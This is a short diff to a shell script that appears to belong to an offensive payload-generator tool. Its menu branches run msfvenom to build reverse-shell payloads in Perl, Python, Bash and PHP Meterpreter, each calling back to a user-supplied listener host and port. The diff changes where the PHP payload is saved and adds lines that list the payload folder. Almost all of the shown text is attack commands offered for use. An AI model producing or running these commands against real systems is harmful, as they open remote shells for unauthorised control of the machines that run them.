@@ -58,10 +58,12 @@ case "$REPLY" in
      6) msfvenom -p cmd/unix/reverse_perl LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.pl ;;
      7) msfvenom -p cmd/unix/reverse_python LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.py ;;
      8) msfvenom -p cmd/unix/reverse_bash LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.sh ;;
-     9) msfvenom -p php/meterpreter_reverse_tcp LHOST=$lip LPORT=$lport -f raw > payloads/$bkname.php ;;
+     9) msfvenom -p php/meterpreter_reverse_tcp LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.php ;;
      10) wasp ;;
      11) exit ;;
      *) echo; echo "Invalid choice."; echo
 esac
+echo -e "\e[1;31m. Go to /usr/share/wasp/payloads/ \e[0m"
+ls /usr/share/wasp/payloads/
 sleep 1
 done
